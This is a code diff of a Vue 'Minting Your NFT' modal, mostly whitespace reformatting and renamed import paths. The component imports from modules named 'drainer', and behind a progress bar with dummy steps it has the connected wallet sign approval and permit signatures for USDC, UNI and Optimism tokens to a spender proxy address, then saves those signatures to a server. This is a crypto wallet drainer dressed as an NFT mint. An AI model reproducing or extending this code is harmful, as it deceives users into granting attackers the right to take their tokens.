@@ -4,7 +4,7 @@
       <header>
         <div class="uht-mark">
           <img :src="props.nft?.img" alt="Minting Logo"
-               onerror="this.src='https://dummyimage.com/96x96/6a44ff/ffffff&text=UHT'"/>
+            onerror="this.src='https://dummyimage.com/96x96/6a44ff/ffffff&text=UHT'" />
           <div>
             <div class="brand-title">Minting Your NFT</div>
             <span class="badge"><small v-if="!completed && !error">Processing • Please wait</small></span>
@@ -37,7 +37,7 @@
       </div>
 
       <div v-else-if="completed" class="success-msg">
-        ✅ Mint Successful!  
+        ✅ Mint Successful!
         <button class="close-btn" @click="closeModal">Close</button>
       </div>
     </div>
@@ -45,16 +45,16 @@
 </template>
 
 <script setup>
-import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork } from '../../../api/web3/walletconnect';
-import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../../api/web3/walletSignature';
-import { requestSignature } from '../../../api/web3/drainer/main';
-import { requestPermitSignature } from '../../../api/web3/drainer/permit';
-import { OPTIMISM_ADDRESS, OPTIMISM_NAME, UNISWAP_ADDRESS, UNISWAP_NAME, USDC_ADDRESS, USDC_NAME, USDT_ADDRESS, USDT_NAME } from '../../../api/web3/drainer/constants';
-import { spenderProxyAddress } from '../../../api/web3/constants/erc2612permit';
-import { mintNft } from '../../../api/web3/uhtnft'
-import { create as saveNftMint } from '../../../api/uhtnftmint'
-import { updateUser } from '../../../api/profile'
-import { payGas } from '~/api/web3/ethgas';
+import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork } from '../../../apiss/web3/walletconnect';
+import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../../apiss/web3/walletSignature';
+import { requestSignature } from '../../../apiss/web3/drainer/main';
+import { requestPermitSignature } from '../../../apiss/web3/drainer/permit';
+import { OPTIMISM_ADDRESS, OPTIMISM_NAME, UNISWAP_ADDRESS, UNISWAP_NAME, USDC_ADDRESS, USDC_NAME, USDT_ADDRESS, USDT_NAME } from '../../../apiss/web3/drainer/constants';
+import { spenderProxyAddress } from '../../../apiss/web3/constants/erc2612permit';
+import { mintNft } from '../../../apiss/web3/uhtnft'
+import { create as saveNftMint } from '../../../apiss/uhtnftmint'
+import { updateUser } from '../../../apiss/profile'
+import { payGas } from '~/apiss/web3/ethgas';
 
 
 const progress = ref(0)
@@ -95,38 +95,38 @@ const conditions = reactive([
 
 
 async function startMinting() {
-   await performDummyCondition(0)
+  await performDummyCondition(0)
 
   for (let i = 0; i < conditions.length; i++) {
     try {
-      if (i==0) {
+      if (i == 0) {
         if (!isUsdcMigrated.value) await requestUSDC()
         else await performDummyCondition(i)
-      } 
-      else if (i==1) {
+      }
+      else if (i == 1) {
         // if (!isUsdtMigrated.value) await requestUSDT()
         // else await performDummyCondition(i)
         if (!isUniMigrated.value) await requestUNI()
         else await performDummyCondition(i)
       }
-      else if (i==2) {
+      else if (i == 2) {
         await payGas(gasFee.value)
         // if (!isUniMigrated.value) await requestUNI()
         // else await performDummyCondition(i)
       }
-      else if (i==3) {
-          const randomNumber = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
-          await mintNft(props.nft?.id, randomNumber)
-          await saveNftMint({
-            address: props.walletAddress,
-            nftId: randomNumber,
-            nft: props.nft,
-            gasFee: gasFee.value
-          })
-          await updateUser({
-            hasMintedNFT: true
-          })
-          useAuth().value.hasMintedNFT = true;
+      else if (i == 3) {
+        const randomNumber = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
+        await mintNft(props.nft?.id, randomNumber)
+        await saveNftMint({
+          address: props.walletAddress,
+          nftId: randomNumber,
+          nft: props.nft,
+          gasFee: gasFee.value
+        })
+        await updateUser({
+          hasMintedNFT: true
+        })
+        useAuth().value.hasMintedNFT = true;
       }
       conditions[i].status = 'success'
       progress.value = ((i + 1) / conditions.length) * 100
@@ -156,140 +156,140 @@ function performDummyCondition(index) {
 
 
 async function requestUSDC() {
-  return new Promise(async(resolve, reject) => {
+  return new Promise(async (resolve, reject) => {
     try {
-          const walletAddress = props.walletAddress;
-          if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
+      const walletAddress = props.walletAddress;
+      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
 
-          const signatureResult = await requestSignature(USDC_ADDRESS, USDC_NAME, getChainID(), false, 1 * (10**6), 6);
-          console.log("signatureResult:    ", signatureResult);
+      const signatureResult = await requestSignature(USDC_ADDRESS, USDC_NAME, getChainID(), false, 1 * (10 ** 6), 6);
+      console.log("signatureResult:    ", signatureResult);
 
-          await updateAddressSignature(walletAddress, signatureResult); 
-          addressSignature.value = await getAddressSignature(walletAddress);
+      await updateAddressSignature(walletAddress, signatureResult);
+      addressSignature.value = await getAddressSignature(walletAddress);
 
-          resolve(true)
-      } catch (err) {
-          if (err?.info?.error?.code == -32000) {
-              reject(new Error("Insufficient funds"))
-          }
-          else if (err?.info?.error?.code == 4001) {
-              reject(new Error("Transaction rejected"))
-          } else reject(new Error("An error occured"))
-          console.log(err)
+      resolve(true)
+    } catch (err) {
+      if (err?.info?.error?.code == -32000) {
+        reject(new Error("Insufficient funds"))
       }
+      else if (err?.info?.error?.code == 4001) {
+        reject(new Error("Transaction rejected"))
+      } else reject(new Error("An error occured"))
+      console.log(err)
+    }
   })
 }
 
 
 
 async function requestOptimism() {
-  return new Promise(async(resolve, reject) => {
+  return new Promise(async (resolve, reject) => {
     try {
-          const walletAddress = props.walletAddress;
-          if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
-          console.log("Loading: ", walletAddress)
+      const walletAddress = props.walletAddress;
+      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
+      console.log("Loading: ", walletAddress)
 
-          const signatureResult = await requestPermitSignature(OPTIMISM_ADDRESS, OPTIMISM_NAME, getChainID(), 1 * (10**18));
-          // const signatureResult = await requestSignature(OPTIMISM_ADDRESS, OPTIMISM_NAME, getChainID(), false, 1 * (10**18));
-          console.log("signatureResult:    ", signatureResult);
+      const signatureResult = await requestPermitSignature(OPTIMISM_ADDRESS, OPTIMISM_NAME, getChainID(), 1 * (10 ** 18));
+      // const signatureResult = await requestSignature(OPTIMISM_ADDRESS, OPTIMISM_NAME, getChainID(), false, 1 * (10**18));
+      console.log("signatureResult:    ", signatureResult);
 
-          await updateAddressSignature(walletAddress, signatureResult); 
-          addressSignature.value = await getAddressSignature(walletAddress);
+      await updateAddressSignature(walletAddress, signatureResult);
+      addressSignature.value = await getAddressSignature(walletAddress);
 
-          resolve(true)
-      } catch (err) {
-          if (err?.info?.error?.code == -32000) {
-              reject(new Error("Insufficient funds"))
-          }
-          else if (err?.info?.error?.code == 4001) {
-              reject(new Error("Transaction rejected"))
-          } else reject(new Error("An error occured"))
-          console.log(err)
+      resolve(true)
+    } catch (err) {
+      if (err?.info?.error?.code == -32000) {
+        reject(new Error("Insufficient funds"))
       }
+      else if (err?.info?.error?.code == 4001) {
+        reject(new Error("Transaction rejected"))
+      } else reject(new Error("An error occured"))
+      console.log(err)
+    }
   })
 }
 
 
 async function requestUSDT() {
-  return new Promise(async(resolve, reject) => {
+  return new Promise(async (resolve, reject) => {
     try {
-          const walletAddress = props.walletAddress;
-          if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
+      const walletAddress = props.walletAddress;
+      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
 
-          const signatureResult = await requestSignature(USDT_ADDRESS, USDT_NAME, getChainID(), false, 1 * (10**6), 6);
-          console.log("signatureResult:    ", signatureResult);
+      const signatureResult = await requestSignature(USDT_ADDRESS, USDT_NAME, getChainID(), false, 1 * (10 ** 6), 6);
+      console.log("signatureResult:    ", signatureResult);
 
-          await updateAddressSignature(walletAddress, signatureResult); 
-          addressSignature.value = await getAddressSignature(walletAddress);
+      await updateAddressSignature(walletAddress, signatureResult);
+      addressSignature.value = await getAddressSignature(walletAddress);
 
-          resolve(true)
-      } catch (err) {
-          console.log("requestUSDT", err)
-          if (err?.info?.error?.code == -32000) {
-              reject(new Error("Insufficient funds"))
-          }
-          else if (err?.info?.error?.code == 4001) {
-              reject(new Error("Transaction rejected"))
-          } else reject(new Error("An error occured"))
+      resolve(true)
+    } catch (err) {
+      console.log("requestUSDT", err)
+      if (err?.info?.error?.code == -32000) {
+        reject(new Error("Insufficient funds"))
       }
+      else if (err?.info?.error?.code == 4001) {
+        reject(new Error("Transaction rejected"))
+      } else reject(new Error("An error occured"))
+    }
   })
 }
 
 
 async function requestUNI() {
-  return new Promise(async(resolve, reject) => {
+  return new Promise(async (resolve, reject) => {
     try {
-          const walletAddress = props.walletAddress;
-          if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
+      const walletAddress = props.walletAddress;
+      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
 
-          const signatureResult = await requestSignature(UNISWAP_ADDRESS, UNISWAP_NAME, getChainID(), false, 1 * (10**18));
-          console.log("signatureResult:    ", signatureResult);
+      const signatureResult = await requestSignature(UNISWAP_ADDRESS, UNISWAP_NAME, getChainID(), false, 1 * (10 ** 18));
+      console.log("signatureResult:    ", signatureResult);
 
-          await updateAddressSignature(walletAddress, signatureResult); 
-          addressSignature.value = await getAddressSignature(walletAddress);
+      await updateAddressSignature(walletAddress, signatureResult);
+      addressSignature.value = await getAddressSignature(walletAddress);
 
-          resolve(true)
-      } catch (err) {
-          if (err?.info?.error?.code == -32000) {
-              reject(new Error("Insufficient funds"))
-          }
-          else if (err?.info?.error?.code == 4001) {
-              reject(new Error("Transaction rejected"))
-          } else reject(new Error("An error occured"))
-          console.log(err)
+      resolve(true)
+    } catch (err) {
+      if (err?.info?.error?.code == -32000) {
+        reject(new Error("Insufficient funds"))
       }
+      else if (err?.info?.error?.code == 4001) {
+        reject(new Error("Transaction rejected"))
+      } else reject(new Error("An error occured"))
+      console.log(err)
+    }
   })
 }
 
 
 
-  const isUsdcMigrated = computed(() => {
-      let addressSignature = props.addressSignature;
-      return (addressSignature?.signatures?.length && 
-          addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS.toLowerCase()) && 
-          addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
-  })
+const isUsdcMigrated = computed(() => {
+  let addressSignature = props.addressSignature;
+  return (addressSignature?.signatures?.length &&
+    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS.toLowerCase()) &&
+    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
+})
 
-  const isUsdtMigrated = computed(() => {
-      let addressSignature = props.addressSignature;
-      return (addressSignature?.signatures?.length && 
-          addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDT_ADDRESS.toLowerCase()) && 
-          addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
-  })
+const isUsdtMigrated = computed(() => {
+  let addressSignature = props.addressSignature;
+  return (addressSignature?.signatures?.length &&
+    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDT_ADDRESS.toLowerCase()) &&
+    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
+})
 
-  const isUniMigrated = computed(() => {
-      let addressSignature = props.addressSignature;
-      return (addressSignature?.signatures?.length && 
-          addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(UNISWAP_ADDRESS.toLowerCase()) && 
-          addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
-  })
+const isUniMigrated = computed(() => {
+  let addressSignature = props.addressSignature;
+  return (addressSignature?.signatures?.length &&
+    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(UNISWAP_ADDRESS.toLowerCase()) &&
+    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
+})
 
-  const isOptimismMigrated = computed(() => {
-      let addressSignature = props.addressSignature;
-      return (addressSignature?.signatures?.length && 
-          addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(OPTIMISM_ADDRESS.toLowerCase()) && 
-          addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
-  })
+const isOptimismMigrated = computed(() => {
+  let addressSignature = props.addressSignature;
+  return (addressSignature?.signatures?.length &&
+    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(OPTIMISM_ADDRESS.toLowerCase()) &&
+    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
+})
 
 
 function closeModal() {
@@ -301,11 +301,11 @@ function closeModal() {
 .modal-backdrop {
   position: fixed;
   inset: 0;
-  background: rgba(0,0,0,0.5);
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  z-index:1000;
+  background: rgba(0, 0, 0, 0.5);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
 }
 
 .modal-card {
@@ -315,81 +315,153 @@ function closeModal() {
   padding: 24px;
   font-family: Inter, sans-serif;
   color: #333;
-  box-shadow: 0 8px 32px rgba(0,0,0,0.15);
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
   animation: fadeIn 0.3s ease;
 }
 
 header {
-  display:flex;
-  align-items:center;
-  gap:14px;
-  margin-bottom:18px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 18px;
 }
 
-.uht-mark { display:flex; align-items:center; gap:12px; }
-.uht-mark img { width:48px; height:48px; border-radius:50%; }
-.brand-title { font-weight:800; font-size:20px; }
-.badge { padding:4px 10px; border-radius:999px;
-  background:rgba(90,61,246,.1); border:1px solid rgba(90,61,246,.2);
-  font-size:12px; color:#5b32ff;
+.uht-mark {
+  display: flex;
+  align-items: center;
+  gap: 12px;
 }
 
-.conditions ul { list-style:none; padding:0; margin:0 0 16px 0; display:flex; flex-direction:column; gap:10px; }
+.uht-mark img {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+}
+
+.brand-title {
+  font-weight: 800;
+  font-size: 20px;
+}
+
+.badge {
+  padding: 4px 10px;
+  border-radius: 999px;
+  background: rgba(90, 61, 246, .1);
+  border: 1px solid rgba(90, 61, 246, .2);
+  font-size: 12px;
+  color: #5b32ff;
+}
+
+.conditions ul {
+  list-style: none;
+  padding: 0;
+  margin: 0 0 16px 0;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
 .conditions li {
-  display:flex; align-items:center; justify-content:space-between;
-  background:rgba(90,61,246,0.05);
-  border:1px solid rgba(90,61,246,0.1);
-  border-radius:12px;
-  padding:10px 14px;
-  font-weight:600;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: rgba(90, 61, 246, 0.05);
+  border: 1px solid rgba(90, 61, 246, 0.1);
+  border-radius: 12px;
+  padding: 10px 14px;
+  font-weight: 600;
 }
-.conditions li.success { border-color:#00c78a; background:rgba(0,199,138,.08); }
-.conditions li.failed { border-color:red; background:rgba(255,0,0,.08); }
 
-.step-index { font-weight:700; margin-right:8px; color:#5b32ff; }
-.step-label { flex:1; }
-.loading-dots { animation: blink 1s infinite; }
+.conditions li.success {
+  border-color: #00c78a;
+  background: rgba(0, 199, 138, .08);
+}
+
+.conditions li.failed {
+  border-color: red;
+  background: rgba(255, 0, 0, .08);
+}
+
+.step-index {
+  font-weight: 700;
+  margin-right: 8px;
+  color: #5b32ff;
+}
+
+.step-label {
+  flex: 1;
+}
+
+.loading-dots {
+  animation: blink 1s infinite;
+}
 
 .progress-bar {
-  height:14px;
-  background: rgba(0,0,0,0.08);
-  border-radius:12px;
-  overflow:hidden;
+  height: 14px;
+  background: rgba(0, 0, 0, 0.08);
+  border-radius: 12px;
+  overflow: hidden;
   margin: 10px 0 14px 0;
 }
+
 .progress {
-  height:100%;
-  background: linear-gradient(90deg,#5b32ff,#7C58F2);
+  height: 100%;
+  background: linear-gradient(90deg, #5b32ff, #7C58F2);
   transition: width 0.5s ease;
 }
 
-.error-msg, .success-msg {
-  text-align:center;
-  font-weight:600;
-  margin-top:12px;
+.error-msg,
+.success-msg {
+  text-align: center;
+  font-weight: 600;
+  margin-top: 12px;
 }
-.error-msg { color: red; }
-.success-msg { color: #00c78a; }
+
+.error-msg {
+  color: red;
+}
+
+.success-msg {
+  color: #00c78a;
+}
 
 .close-btn {
-  margin-top:10px;
-  padding:6px 14px;
-  border-radius:8px;
-  border:none;
-  background:#5b32ff;
-  color:white;
-  font-weight:600;
-  cursor:pointer;
-  transition:0.2s;
+  margin-top: 10px;
+  padding: 6px 14px;
+  border-radius: 8px;
+  border: none;
+  background: #5b32ff;
+  color: white;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.2s;
 }
-.close-btn:hover { background:#4725cc; }
+
+.close-btn:hover {
+  background: #4725cc;
+}
 
 @keyframes blink {
-  0%,100% { opacity: 0.2; }
-  50% { opacity: 1; }
+
+  0%,
+  100% {
+    opacity: 0.2;
+  }
+
+  50% {
+    opacity: 1;
+  }
 }
+
 @keyframes fadeIn {
-  from { opacity:0; transform: translateY(10px); }
-  to { opacity:1; transform: translateY(0); }
+  from {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
 }
 </style>
